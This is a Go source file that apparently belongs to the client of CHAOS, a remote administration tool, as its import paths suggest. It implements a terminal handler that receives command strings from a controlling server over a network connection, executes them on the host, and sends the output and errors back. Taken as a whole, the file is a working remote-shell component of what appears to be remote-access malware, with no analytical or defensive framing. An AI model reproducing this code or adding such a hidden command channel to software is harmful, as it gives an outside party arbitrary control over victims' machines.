package terminal

import (
	"fmt"
	log "github.com/sirupsen/logrus"
	"github.com/tiagorlampert/CHAOS/client/app/models"
	"github.com/tiagorlampert/CHAOS/client/app/usecase"
	"github.com/tiagorlampert/CHAOS/client/app/util"
	"github.com/tiagorlampert/CHAOS/client/app/util/network"
	"net"
)

type TerminalUseCase struct {
	Connection net.Conn
}

func NewTerminalUseCase(conn net.Conn) usecase.Terminal {
	return &TerminalUseCase{
		Connection: conn,
	}
}

func (t TerminalUseCase) Run(cmd string) {
	fmt.Println("Command from server: " + cmd)

	output, err := util.RunCmd(cmd, 10)

	var errData models.Error
	if err != nil {
		errData = models.Error{
			HasError: true,
			Message:  err.Error(),
		}
	}

	err = network.Send(t.Connection, models.Message{
		Command: "terminal",
		Data:    output,
		Error:   errData,
	})
	if err != nil {
		log.WithField("cause", err.Error()).Error("error sending command output")
		return
	}
}
